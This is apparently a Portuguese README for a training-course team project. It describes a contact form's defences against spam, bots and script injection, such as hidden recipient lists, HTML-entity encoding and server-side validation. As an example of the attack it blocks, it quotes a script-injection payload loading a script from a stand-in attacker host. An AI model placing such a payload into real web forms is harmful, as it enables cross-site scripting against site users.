
# Itaú10estrelas

Repositório para desenvolvimento do desafio do grupo 05 do treinamento Itaú, edição PCD, maio de 2021.

## Integrantes: 

* Ângelo Beck
* Daniel Ferreira
* Eduardo Silva Rocha
* Jhony Ferreira Cruz Zuim é um cara legal
* Leandro Silva Araujo
* Letícia dos Santos Silva
* Luan Felipe da Cruz Brito
* Paulo Ricardo Barbosa de Souza
* Rafaela Souza Plachta
* Vanessa Gomes de Oliveira

## Considerações sobre segurança

Quando publicamos conteúdos na Internet, precisamos estar atentos aos ataques. Embora pareça estranho preocupar-se com uma simples publicação de textos, um único email inserido no conteúdo pode ser alvo para spammers.

Mais cuidado ainda quando desenvolvemos ferramentas interativas, onde os "bots" tentarão submeter formulários ou mesmo hackers poderão tentar enviar mensagens indesejadas através de possíveis brechas na segurança.

### Segurança total é impossível

Um sistema 100% seguro é quase impossível. Porém, um elevado cuidado com a segurança irá desencorajar os hackers desde que eles percebam que o esforço para quebrar a segurança não lhes traga uma recompensa valiosa o suficiente.

No nosso caso, um formulário que envia emails poderia oferecer aos hackers diversos objetivos interessantes:

1. Os hackers poderiam utilizar seus bots para encontrar endereços de emails válidos em nosso formulário. Estes endereços poderiam ser acrescentados às suas listas de SPAMS, para distribuir mensagens indesejadas aos integrantes do nosso grupo.

2. Os hackers poderiam tentar quebrar a segurança, e tentar utilizar o back-end para disparar SPAMS através dele para diversos usuários pelo mundo.

3. Os hackers poderiam utilizar o formulário para injetar scripts maliciosos nas mensagens, fazendo com que emails infectados sejam enviados aos integrantes do nosso grupo.

4. Os hakers poderiam utilizar seus bots para enviar mensagens spams para os integrantes do nosso grupo diretamente através do nosso formulário.

### Impedindo a coleta de endereços de email

Nosso formulário não envia ao back-end os endereços de destino. Ao invés, somente o nome do integrante é enviado. No back-end, uma lista secreta contém os emails válidos para completar a operação.

### Impedindo o envio de emails para outras pessoas

Como a lista de emails válidos está no back-end, somente é possível utilizar nosso formulário para enviar emails para os integrantes do nosso grupo. Qualquer tentativa de burlar esta regra será malograda e retornará uma mensagem de erro.

### Impedindo injeção de scripts

Todos os conteúdos inseridos no formulário são filtrados antes do envio, para garantir que caracteres especiais não causem problemas durante o transporte.

No back-end, os caracteres filtrados são recuperados e a mensagem original é reconstituída.

Porém, alguns caracteres especiais são convertidos, no back-end, para "HTML entities" -- sequências especiais que fazem os caracteres serem impressos corretamente na tela ao invés de serem interpretados como código HTML.

Desta forma, evitamos que um ataque de injeção de script não tenha êxito:

~~~
<script src="sou-hacker.com/script-malvado.js"></script>
~~~

### Driblando robôs

Nosso formulário utiliza X-HTTP-Request para submeter os dados do formulário, e o endereço do back-end está "hardcoded" dentro do script. Como a maioria dos crawlers (softwares robôes) que vasculham a rede e tentam enviar formulários não executam scripts, dificilmente algum deles tterá êxito ao tentar enviar qualquer coisa através do nosso formulário.

## Dupla verificação

Alguns campos do formulário são de preenchimento obrigatório. O javascript irá verificar os campos antes de submeter o formulário. Porém, o back-end fará uma segunda verificação, de modo que alguém que tente adulterar o formulário e enviar campos vazios ou dados inválidos, não terá êxito e receberá uma mensagem de erro do servidor.
